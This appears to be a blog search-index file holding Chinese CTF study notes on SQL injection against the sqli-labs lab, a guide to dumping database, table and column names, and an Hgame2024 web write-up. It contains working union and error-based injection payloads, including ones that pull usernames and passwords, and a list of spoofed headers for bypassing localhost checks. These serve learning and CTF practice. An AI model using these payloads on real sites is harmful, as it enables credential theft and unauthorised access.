<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SQL 学习笔记</title>
    <link href="/2024/09/07/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/07/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-学习笔记"><a href="#SQL-学习笔记" class="headerlink" title="SQL 学习笔记"></a>SQL 学习笔记</h1><h1 id="SQL-学习笔记-1"><a href="#SQL-学习笔记-1" class="headerlink" title="SQL 学习笔记"></a>SQL 学习笔记</h1><p>本篇笔记内容与 B 站课程 <a href="https://www.bilibili.com/video/BV1c34y1h7So?spm_id_from=333.1245.0.0">SQL 注入由简入精</a>基本一致，为知识点和个人心得总结。</p><h1 id="sqli-labs-靶场搭建"><a href="#sqli-labs-靶场搭建" class="headerlink" title="sqli-labs 靶场搭建"></a>sqli-labs 靶场搭建</h1><ol><li>下载 phpstudy</li><li>github 上下载 sqli-labs 环境复制到 phpstudy 根目录下</li></ol><h1 id="SQL-基础常用语法语句"><a href="#SQL-基础常用语法语句" class="headerlink" title="SQL 基础常用语法语句"></a>SQL 基础常用语法语句</h1><h2 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h2><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p><code>show databases;</code></p><p>（根目录下输入）查看数据库</p><p><code>create database employees charset utf8;</code></p><p>创建数据库 employees 并选择字符集</p><p><code>drop database employees;</code></p><p>删除数据库 employees</p><p><code>use employees;</code></p><p>选择进入数据库 employees</p><h3 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> employee<br>(<br>id <span class="hljs-type">int</span>,<br><span class="hljs-type">name</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">40</span>),<br>sex <span class="hljs-type">char</span>(<span class="hljs-number">4</span>),<br>birthday data,<br>job <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>)<br>);<br></code></pre></td></tr></table></figure><p>创建数据表 employee，必须设定列</p><p><code>drop table employee;</code></p><p>删除数据表</p><p><code>rename table employee to user;</code></p><p>修改数据表名称为 user</p><p><code>alter table user character set utf8;</code></p><p>修改字符集</p><h3 id="数据列和数据行"><a href="#数据列和数据行" class="headerlink" title="数据列和数据行"></a>数据列和数据行</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">user</span><br>(<br>    id,<span class="hljs-type">name</span>,sex,birthday,job)<br><span class="hljs-keyword">values</span><br>(<br>    <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;ctfstu&#x27;</span>,<span class="hljs-string">&#x27;male&#x27;</span>,<span class="hljs-string">&#x27;1999-05-06&#x27;</span>,<span class="hljs-string">&#x27;IT&#x27;</span>)<br>;<br></code></pre></td></tr></table></figure><p>写入内容</p><p><code>alter table user add salary decimal(8,2);</code></p><p>增加一列内容 salary，最大 8 位，小数点后保留 2 位</p><p><code>update user set salary=5000;</code></p><p>修改所有工资为 5000</p><p><code>update user set name=&#39;benben&#39; where id=1;</code></p><p>修改 id&#x3D;1 的行 name 为 benben</p><p><code>update user set name=&#39;benben2&#39;,salary=3000 where id=1;</code></p><p>修改 id&#x3D;1 的行 name 为 benben2，工资为 3000</p><p><code>alter table user drop salary;</code></p><p>删除指定列</p><p><code>delete from user where job=&#39;IT&#39;;</code></p><p>删除指定行</p><p><code>delete from user;</code></p><p>删除表中所有数据（不删除表的结构）</p><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>基础查询词：</p><p><code>select</code>，<code>from</code>，<code>where</code></p><p>查询参数指令：</p><p><code>union</code>，<code>group by</code>，<code>order by</code>，<code>limit</code>，<code>and</code>，<code>or</code></p><p>常用函数：</p><p><code>group_concat()</code>，<code>database()</code>，<code>version()</code></p><h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><p><code>select * from user where id=1;</code></p><p>select+ 列名（*代表所有）+from+ 表名（user）+where+ 条件语句（id&#x3D;1）+;</p><p><code>select * from user where id in (&#39;1&#39;);</code></p><p>在 user 表中查询所有包含 id 为 1 的数据</p><p><code>select * from user where id=(select id from user where username=(&#39;admin&#39;));</code></p><p>子查询，优先执行()内语句</p><h3 id="查询参数指令"><a href="#查询参数指令" class="headerlink" title="查询参数指令"></a>查询参数指令</h3><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><p><code>select id from user union select email_id from emails;</code></p><p>查询并合并数据显示</p><p><code>select * from user where id=6 union select * from emails where id=6;</code>（错误示例）</p><p>返回 <code>ERROR: have a different number of columns</code> 联合注入 union 左右表格列数必须相等，此例 user 有 3 列，emails 有 2 列</p><p><code>select * from user where id=6 union select *,3 from emails where id=6;</code>（正确示例）</p><p>由于 union 右比左少一列，因此用 3 作为填充列，使左右列数相等，查询结果 emails 部分第三列数据即为 3</p><h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>本身实现的是分组功能但也可用于判断列数。由于存在一些问题不推荐常用，例如：user 表中有两条相同姓名不同 id 的数据，只对一列分组可以，对多列分组会报错。一些防火墙过滤可能不严格，可以方便利用。</p><p><code>select username from user group by username;</code></p><p>在 user 表中查询 username 列，按 username 分组输出</p><p><code>select username from user group by 1;</code></p><p>同上输出，username 仅一列，本句查询按第一列分组</p><p><code>select username from user group by 2;</code></p><p>报错，username 仅一列，本句查询按第二列分组，不存在第二列</p><p><code>select * from user group by 2;</code></p><p>正常输出，user 表三列数据，按 user 表内第二列分组。</p><p>想要判断列数则可以根据以上原理从 2 开始 3、4、5······往后尝试，当出现报错时的数-1 即为列数</p><p>实际 SQL 注入时使用二分法，先取一个足够大会返回报错的数，而后不断取半（中间数），直到找到边界。</p><p>例如 <code>select * from user where id=1 group by 10;</code> 10-&gt;5-&gt;3-&gt;4</p><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p>本身实现的是排序，同 group by 可用于判断列数</p><p><code>select * from user order by id;</code></p><p>在 user 表中按 id 升序排序</p><p><code>select * from user where username=&#39;Xiao Ming&#39; order by id;</code></p><p>可在 order by 前加入 where 条件</p><p><code>select * from user where username=&#39;Xiao Ming&#39; order by id desc;</code></p><p>order by 的排序默认升序，在后面加 desc 改为降序</p><p><code>select * from user order by 1;</code></p><p>同 group by 一样可按第几列排序，判断列数方法同样相似</p><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>限制输出内容数量，一般用于报错注入，限数显示报错反馈信息</p><p><code>select * from user limit 0,3;</code></p><p>限制为从第 1 行开始显示 3 行，在这里实际的第一行就是命令里的第 0 行</p><p>当回显内容有限想查看同一级其他数据时可以在语句后加上 <code>limit 0,1</code>，<code>limit1,1</code>，<code>limit2,1</code> 等等</p><h4 id="and-or"><a href="#and-or" class="headerlink" title="and &amp; or"></a>and &amp; or</h4><p>即“与”和“或”。额算是比较重要但也没什么好说的。</p><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>将多行合并拼接至一行显示（并用指定分隔符分隔），在 union 注入及报错注入时 group_concat 尤为重要</p><p><code>select group_concat(id,username,password) from user;</code></p><p>将 user 表内的 id，username，password 合并在一行输出</p><p>当遇到限制回显数量只有一条时，就可以用 <code>group_concat()</code> 较方便的一次性获得所有内容，例如 <code>group_concat(table_name)</code>，比 <code>limit</code> 一条一条查更方便。但是如果源码当中显示位数设置较少的话这种方法就可能导致显示不全，用 <code>limit</code> 则更加稳妥</p><h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>效果与 group_concat()类似，是将任意长度的多个字符串拼接成一个字符串，在报错注入时也是尤为重要</p><h4 id="select-database"><a href="#select-database" class="headerlink" title="select database()"></a>select database()</h4><p>查看当前数据库名称</p><h4 id="select-version"><a href="#select-version" class="headerlink" title="select version()"></a>select version()</h4><p>查看当前数据库版本，防火墙绕过时用得到，方便找到对应版本的漏洞</p><h1 id="SQL-注入基础"><a href="#SQL-注入基础" class="headerlink" title="SQL 注入基础"></a>SQL 注入基础</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>SQL 注入就是通过构造一条精巧的 SQL 命令语句来查询得到想要的信息。</p><p>注入点即可以实现输入的地方，通常是一个访问数据库的连接。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>按查询字段分：</p><p>数字型，输入参数为整型</p><p>字符型，输入参数为字符串（被单引号闭合）</p><p>按注入方法分：<br>union 注入、报错注入、布尔注入、时间注入</p><h2 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h2><h3 id="数字型-or-字符型？"><a href="#数字型-or-字符型？" class="headerlink" title="数字型 or 字符型？"></a>数字型 or 字符型？</h3><p>数字型提交内容一般为数字，但<u>数字不一定是数字型</u>，<u>数字型不需要闭合符来闭合</u></p><p>字符型提交内容则需要<u>闭合符闭合</u></p><p>1.使用 <code>and 1=1</code> 和 <code>and 1=2</code> 来判断</p><p>如果为数字型，前者照常显示返回信息，后者不会显示，因为 1 与 2 不等</p><p>如果为字符型，两者都能正常显示信息，相当于输入内容均被单引号包裹，and 不作为命令执行</p><p>2.使用(?id)<code>=2-1</code> 来判断</p><p>如果为数字型则返回的是 <code>?id=1</code> 的内容</p><p>如果为字符型则无法计算，返回为 <code>?id=2</code> 的内容</p><p>不推荐用 <code>+</code>，因为 URL 编码通常用 <code>+</code> 和 <code>%20</code> 代替空格，解码时相应会被解码成空格</p><h3 id="若字符型则闭合方式？"><a href="#若字符型则闭合方式？" class="headerlink" title="若字符型则闭合方式？"></a>若字符型则闭合方式？</h3><p>常见闭合方式：</p><p><code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>、<code>&quot;)</code>、其他</p><p>1.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&#39;......</code>，多了一个 <code>&#39;</code> 则闭合符为 <code>&#39;</code></p><p>2.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&quot;......</code>，多了一个 <code>&quot;</code> 则闭合符为 <code>&quot;</code></p><p>3.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&#39;)......</code>，多了一个 <code>&#39;)</code> 则闭合符为 <code>&#39;)</code></p><p>4.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&quot;)......</code>，多了一个 <code>&quot;)</code> 则闭合符为 <code>&quot;)</code></p><p>即尝试输入内容中的闭合符与输入内容前的闭合符闭合，输入内容后原本的闭合符则会变得多余，从而报错，我们根据报错得到命令当中所用的闭合符</p><p>闭合的作用：</p><p>结束前一段查询语句，在后面可加入其他语句，查询需要的参数</p><p>后面不需要的语句可以用注释符 <code>--+</code>（此处跟的 <code>+</code> 实际是代替空格，避免直接输入空格被忽略，也可以通过在空格后随便加上一些内容避免这个问题，例如 <code>-- abc</code>）、<code>#</code>、<code>%23</code> 注释掉</p><h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><p>用二分法判断默认页面数据列数量，参考前面的 union、group by、order by 内容，再使用联合注入获得目标结果</p><p>但是页面只能显示一个内容，union 后的语句查询的内容是不显示的，因此为了显示想要的内容，可以将前一句查询的内容改为数据库中原本不存在的数据，如 <code>id=-1</code>，那么前面一句查询不到结果就只会显示后面一句查询的结果</p><p>此外并非每一列的内容都会回显，要先判断会回显的是哪些列。例如 sqli-labs 的 less-1，注入 <code>?id=-1&#39; union select 1,2,3--+</code>，会回显的是 2、3，因此我们可以二三两列位置换成其他想要的内容，例如 <code>?id=-1&#39; union select 1,version(),database()--+</code></p><p>注入步骤：</p><p>1.查找注入点</p><p>2.判断字符型还是数字型</p><p>3.若是字符型则找到其闭合方式</p><p>4.判断查询列数 group by&#x2F;order by</p><p>5.查询回显位置</p><p>而后可参考这篇小结查询所需信息</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>有时尝试 union 联合注入发现语句正确但无对应回显，而输入错误语句时仍会有报错回显，那么就可以尝试报错注入</p><p>报错注入的基础是后台对于输入输出的合理性未做检测</p><p>报错注入的实现就是构造语句让错误语句中夹杂可以显示数据库内容的查询语句，使得返回的报错提示中包含数据库中的内容</p><h3 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue()报错注入"></a>extractvalue()报错注入</h3><p>extractvalue()函数包含两个参数：XML 文档对象名称、路径</p><p>根据以下例子了解该函数用法</p><p>1、先在 ctfstu 数据库内创建表 xml</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database ctfstu charset utf8;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> xml(doc <span class="hljs-type">varchar</span>(<span class="hljs-number">150</span>));<br></code></pre></td></tr></table></figure><p>2、在表内插入两段数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> xml <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;book&gt;</span><br><span class="hljs-string">&lt;title&gt;A bad boy how to get a</span><br><span class="hljs-string">girlfriend&lt;/title&gt;</span><br><span class="hljs-string">&lt;author&gt;</span><br><span class="hljs-string">&lt;initial&gt;Love&lt;/initial&gt;</span><br><span class="hljs-string">&lt;surname&gt;benben&lt;/surname&gt;</span><br><span class="hljs-string">&lt;/author&gt;</span><br><span class="hljs-string">&lt;/book&gt;</span><br><span class="hljs-string">&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> xml <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;book&gt;</span><br><span class="hljs-string">&lt;title&gt;how to become a bad boy&lt;/title&gt;</span><br><span class="hljs-string">&lt;author&gt;</span><br><span class="hljs-string">&lt;initial&gt;hualong&lt;/initial&gt;</span><br><span class="hljs-string">&lt;surname&gt;Melton&lt;/surname&gt;</span><br><span class="hljs-string">&lt;/author&gt;</span><br><span class="hljs-string">&lt;/book&gt;</span><br><span class="hljs-string">&#x27;</span>);<br></code></pre></td></tr></table></figure><p>3、使用 extractValue()查询 xml 内的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(doc,<span class="hljs-string">&#x27;/book/author/surname&#x27;</span>)<span class="hljs-keyword">from</span> xml;    #查询作者<br><br>返回：<br>benben<br>Melton<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(doc,<span class="hljs-string">&#x27;/book/title&#x27;</span>)<span class="hljs-keyword">from</span> xml;    #查询书名<br><br>返回：<br>A bad boy how <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> a girlfried<br>how <span class="hljs-keyword">to</span> become a bad boy<br></code></pre></td></tr></table></figure><p>4、写错查询参数中的路径</p><p>例如 <code>select extractvalue(doc,&#39;/book/titlelll&#39;)from xml;</code></p><p>结果查询不到内容但是也不会报错</p><p>5、写错查询参数的格式符号</p><p>例如 <code>select extractvalue(doc,&#39;~book/title&#39;)from xml;</code></p><p>显示报错信息 <code>#1105 - XPATH syntax error: &#39;~book/title&#39;</code></p><p>至此我们发现当写错查询参数的格式符号时会有报错返回，显示我们写错的路径。因此我们或许可以尝试在报错之前查询所需信息通过报错返回查看查询结果。</p><p>例如 <code>select extractvalue(doc,concat(0x7e,(select database()))) from xml;</code>，括号内的语句 <code>select database()</code> 优先执行，然后查询结果通过 <code>concat()</code> 函数与 <code>~</code> 符号拼接在一起作为 <code>extractvalue()</code> 函数的路径参数，最后因为格式不符规范，后台返回报错信息，而报错信息中包含“错误路径”也就是我们故意构造的查询语句的查询结果。至此，一次报错注入完成。想要查询其他内容只需要将相应的查询语句替换进 <code>select database()</code> 所在位置。</p><p>实际在运用这种报错注入时通过 <code>union select ......</code> 或者 <code>and 1=......</code> 注入均可，只要最终报错即可</p><p>例如 <code>?id=100&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,&#39;~&#39;,password) from users))) --+</code></p><p>然而报错注入还受到一个限制，<code>extractvalue()</code> 默认只能返回 32 个字符串，有时就会显示不全。对此的解决方法是运用 <code>substring(str,num1,num2)</code> 函数，其中 str 是操作的目标字符串，num1 是起始位置，num2 是截取个数，实现的效果就是显示字符串 str 从第 num1 位起 num2 个字符长度的字符串</p><p>例如 <code>?id=100&#39; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#39;~&#39;,password),25,30) from users))) --+</code></p><h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h3><p>updatexml()函数包含三个参数：XML 文档对象名称、路径、要替换的新数据</p><p>该函数的功能就是更新替换 XML 文档中的指定内容</p><p>该函数的报错原理与 extractvalue()一样，输入带错误符号的第二个参数。该函数也同样存在 32 位的限制，同样参考 extractvalue()用 substring()解决</p><h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h3>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL 爆库名表名列名数据小结</title>
    <link href="/2024/09/07/SQL%E7%88%86%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE%E5%B0%8F%E7%BB%93/"/>
    <url>/2024/09/07/SQL%E7%88%86%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-爆库名表名列名数据小结"><a href="#SQL-爆库名表名列名数据小结" class="headerlink" title="SQL 爆库名表名列名数据小结"></a>SQL 爆库名表名列名数据小结</h1><p>本篇以 BUUCTF-[极客大挑战 2019]BabySQL 1 为例，但不涉及该题详细内容</p><p>题中涉及到双写绕过关键字过滤，在以下不做考虑，仅借用本题场景</p><p>1.通过 <code>order by</code> 判断得出数据表为 3 列，并测试得回显 2、3</p><p>2.获取所有库名 <code>1&#39; union select 1,database(),group_concat(schema_name) from information_schema.schemata #</code> 得到 geek 以及 information_schema,mysql,performance_schema,test,ctf,geek</p><p>3.获取 geek 库中的表名 <code>1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; #</code> 得到 b4bsql,geekuser</p><p>4.获取 geekuser 中的列名 <code>1&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39; #</code> 得到 id,username,password</p><p>5.获取数据 <code>1&#39; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.geekuser #</code> 其中 <code>concat_ws()</code> 函数的功能是指定参数之间的分隔符，<code>0x7e</code> 即为 <code>~</code>，非必须，from 后的格式为“库名.表名”</p><p>参考：<a href="https://www.cnblogs.com/xiaobai141/p/14160758.html">https://www.cnblogs.com/xiaobai141/p/14160758.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2024 WP</title>
    <link href="/2024/07/03/Hgame2024/"/>
    <url>/2024/07/03/Hgame2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2024-WP"><a href="#Hgame2024-WP" class="headerlink" title="Hgame2024 WP"></a>Hgame2024 WP</h1><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-Bypass-it"><a href="#1-Bypass-it" class="headerlink" title="1.Bypass it"></a>1.Bypass it</h3><p>一开始想偏了，以为要绕过别的什么，但其实就是绕过对注册的阻止就行，查看html，可以看到注册相关的页面地址。</p><p><img src="/img/Hgame2024/Week1/1.png"></p><p><img src="/img/Hgame2024/Week1/2.png" alt="register_page.php"></p><p>然后直接向register.php传参就好了<code>username=1&amp;password=1&amp;register=注册</code>。然后登录。</p><h3 id="2-ezHTTP"><a href="#2-ezHTTP" class="headerlink" title="2.ezHTTP"></a>2.ezHTTP</h3><p>先是“请从vidar.club访问这个页面”，<code>Referer=vidar.club</code>即可</p><p>再是“请通过Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0访问此页面”，<code>User Agent=Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</code>即可</p><p>然后“请从本地访问这个页面”，我第一个想到的是<code>X-Forwarded-For</code>，但是没反应，发现响应头里有提示“Hint：Not XFF”，所以需要更换其他等效的字段，最终<code>X-Real-IP: 127.0.0.1</code>可以发挥作用。这里附上所有起类似作用的语句（在博客园一篇博客上找到的，忘记具体出处了）</p><pre><code class="hljs">Client-IP:127.0.0.1Forwarded-For-Ip: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded-For: localhostForwarded:127.0.0.1Forwarded: localhostTrue-Client-IP:127.0.0.1X-Client-IP: 127.0.0.1X-Custom-IP-Authorization : 127.0.0.1X-Forward-For: 127.0.0.1X-Forward: 127.0.0.1X-Forward: localhostX-Forwarded-By:127.0.0.1X-Forwarded-By: localhostX-Forwarded-For-Original: 127.0.0.1X-Forwarded-For-original: localhostX-Forwarded-For: 127.0.0.1X-Forwarded-For: localhostX-Forwarded-Server: 127.0.0.1X-Forwarded-Server: localhostX-Forwarded: 127.0.0.1X-Forwarded: localhostX-Forwared-Host: 127.0.0.1X-Forwared-Host: localhostX-Host: 127.0.0.1X-Host: localhostX-HTTP-Host-Override : 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Remote-Addr : localhostX-Remote-IP: 127.0.0.1</code></pre><p>于是“Ok, the flag has been given to you ^-^”，去看响应头发现有“Authorization”，将JWT放到<a href="https://jwt.io/">https://jwt.io/</a>解密即可。</p><h3 id="3-Select-Courses"><a href="#3-Select-Courses" class="headerlink" title="3.Select Courses"></a>3.Select Courses</h3><p>这题我当时没做出来，就放一个官方题解记录一下：</p><hr><p>题⽬主要考察的是选⼿编写脚本的能⼒。</p><p>帮助阿菇选到所有课程，即可获取FLAG。后端逻辑是每间隔 30s-180s 放出⼀⻔课，若 5s 内没有选到课程，则课程⼜会满员。已经被选上的课程不会再放出。当所有课程都选上之后，点击“选完了”按钮，后端判定所有课程都已经被选择，就会返回给前端FLAG。</p><p>选⼿可以⼿动选课，但⼯作量会⽐较⼤；也可以通过编写脚本来⾃动抢课，⽐如基于python的selenium编写抢课脚本：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from selenium import webdriver<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.by</span> import By<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.ui</span> import WebDriverWait<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span> import expected_conditions as EC<br>from <span class="hljs-selector-tag">time</span> import sleep<br><br>driver = webdriver<span class="hljs-selector-class">.Chrome</span>()<br>driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span>)<br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><br>courses_list = <span class="hljs-selector-attr">[]</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>course = &#123;<br><span class="hljs-string">&#x27;panel&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]&#x27;</span>,<br><span class="hljs-string">&#x27;status&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]&#x27;</span>,<br><span class="hljs-string">&#x27;submit&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[6]/button&#x27;</span><br>&#125;<br>courses_list<span class="hljs-selector-class">.append</span>(course)<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(courses_list)</span></span><br><br>while courses_list:<br>driver<span class="hljs-selector-class">.refresh</span>()<br><span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> courses_list:<br>panel = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;panel&#x27;</span>]</span>)<br>panel<span class="hljs-selector-class">.click</span>()<br>status_element = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;status&#x27;</span>]</span>)<br>status_text = status_element<span class="hljs-selector-class">.text</span><br><span class="hljs-built_in">print</span>(status_text)<br><span class="hljs-keyword">if</span> status_text != <span class="hljs-string">&quot;已满&quot;</span>:<br>submit_button = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;submit&#x27;</span>]</span>)<br>submit_button<span class="hljs-selector-class">.click</span>()<br><span class="hljs-built_in">WebDriverWait</span>(driver, <span class="hljs-number">5</span>)<span class="hljs-selector-class">.until</span>(EC<span class="hljs-selector-class">.alert_is_present</span>())<br>alert = driver<span class="hljs-selector-class">.switch_to</span><span class="hljs-selector-class">.alert</span><br><br>alert<span class="hljs-selector-class">.accept</span>()<br>courses_list<span class="hljs-selector-class">.remove</span>(course)<br>break<br><br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br>driver<span class="hljs-selector-class">.quit</span>()<br></code></pre></td></tr></table></figure><p>同时，也可以编写脚本或使⽤Burpsuite等⼯具持续发包，检测到返回值为 <code>&#123;&#39;full&#39;: 0,&#39;message&#39;: &#39;选课成功！&#39;&#125; </code>即表示抢到某门课。</p><hr><h2 id="misc"><a href="#misc" class="headerlink" 